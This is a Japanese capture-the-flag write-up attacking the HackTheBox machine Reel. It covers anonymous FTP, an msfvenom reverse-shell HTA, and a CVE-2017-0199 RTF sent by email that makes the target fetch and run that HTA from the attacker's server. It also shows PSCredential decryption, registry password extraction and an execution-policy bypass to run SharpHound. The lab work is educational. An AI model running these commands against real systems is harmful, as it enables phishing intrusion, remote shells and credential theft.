# Recon

```
nmap --reason -Pn -T4 -sV -p- 10.10.10.77
...
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 7.6 (protocol 2.0)
25/tcp open  smtp?   syn-ack ttl 127
```

ftpにアノニマスログインし、いくつかファイルがあったのでダウンロードする：

```
┌──(shoebill㉿shoebill)-[~]
└─$ ftp 10.10.10.77  
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:shoebill): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
ftp> dir
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx

ftp> get AppLocker.docx
ftp> get readme.txt
ftp> get "Windows Event Forwarding.docx"
```

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/FTP_Docs]
└─$ cat readme.txt 
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

readme.txtの内容より、rtfファイルを送ればそれをレビューしてフォーマット変換するらしい。

rtfに関する脆弱性をググるとCVE-2017-0199が見つかった。

そのツールキットがgithubにあったのでそれを使う：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ git clone https://github.com/bhdresh/CVE-2017-0199.git
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ cd CVE-2017-0199.git
```

このツールキットで、悪意のあるhtaファイルをダウンロード・実行させるようなrtfファイルが作れる。

そこでまず、リバースシェルを起動するようなhtaファイルをつくる：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f hta-psh -o shell.hta
```

ツールキットでrtfファイル（test.rtf）を作る：
```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ python cve-2017-0199_toolkit.py -M gen -t RTF -w test.rtf -u http://10.10.16.5:8000/shell.hta
Generating normal RTF payload.

Generated test.rtf successfull
```
ターゲットがこのrtfファイルを開くと、ローカル（10.10.16.5）の8000ポートで立っているHTTPサーバにアクセスが来て、shell.htaをダウンロード実行する。

さて、肝心の”送り先メールアドレス”について。次のように、Windows Event Forwarding.docx（Windows_Event_Forwarding.docxに改名した）のメタデータにメールアドレスがある：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ exiftool Windows_Event_Forwarding.docx
ExifTool Version Number         : 12.44
File Name                       : Windows_Event_Forwarding.docx
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2017:11:01 06:13:23+09:00
File Access Date/Time           : 2022:10:30 20:14:09+09:00
File Inode Change Date/Time     : 2022:10:30 20:11:30+09:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
...
```

# initial shell

以上でエクスプロイト実行の準備が整った。

リバーシェルに対するリスナーをたてる：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ rlwrap nc -nvlp 4444
```

shell.htaとtest.rtfがあるディレクトリ上でHTTPサーバをたてる：
```                                                 
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
`swaks`コマンドでメールを送る：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ swaks --to nico@megabank.com --from kail@shoebill.com --server 10.10.10.77 --header "test rtf" --body "check my rtf file" --attach ./test.rtf
```

これでユーザnicoのシェルがとれる：

![inishell](https://user-images.githubusercontent.com/85237728/198999395-7382a52b-278c-4873-82f7-6f86cb6e3a41.png)

# Tom's shell

C:\Users\nico\DesktopにユーザtomのPSCredentialがあった：

```
C:\Users\nico\Desktop>dir /a

28/05/2018  20:07    <DIR>          .
28/05/2018  20:07    <DIR>          ..
27/10/2017  23:59             1,468 cred.xml
27/10/2017  22:42               282 desktop.ini
27/10/2017  23:40                32 user.txt
27/10/2017  21:34               162 ~$iledDeliveryNotification.doc
               4 File(s)          1,944 bytes
               2 Dir(s)  15,742,918,656 bytes free

C:\Users\nico\Desktop>type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

PSCredentialを次のように復号する：
```
C:\Users\nico\Desktop> powershell -c "$cred = Import-Clixml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
（なぜかPowerShellを起動するとハングするので、上記のようにDosからPowerShellを実行）

SSHがターゲット上で動いていたことを思い出しTomのシェルをとる：

```
┌──(shoebill㉿shoebill)-[~]
└─$ ssh tom@10.10.10.77
```
ちなみにここでユーザnicoのパスワードが見つかった：
```
tom@REEL C:\Users\tom >reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon                                                        
    ...
    DefaultUserName    REG_SZ    nico                                                                                           
    DisableLockWorkstation    REG_DWORD    0x0                                                                                  
    DefaultPassword    REG_SZ    4dri@na2017!**
```

ありがたいことに、最初からC:\Users\tom\Desktop\AD Audit\BloodHound\IngestorsにSharpHoundが用意されていた。
しかしGroupPolicyによりうまく実行できない。

そこで以下のようにExecutionPolicyを指定してPowerShellを起動しSharpHound.ps1を実行する：

```
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell -ep Bypass
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> . .\SharpHound.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData
```
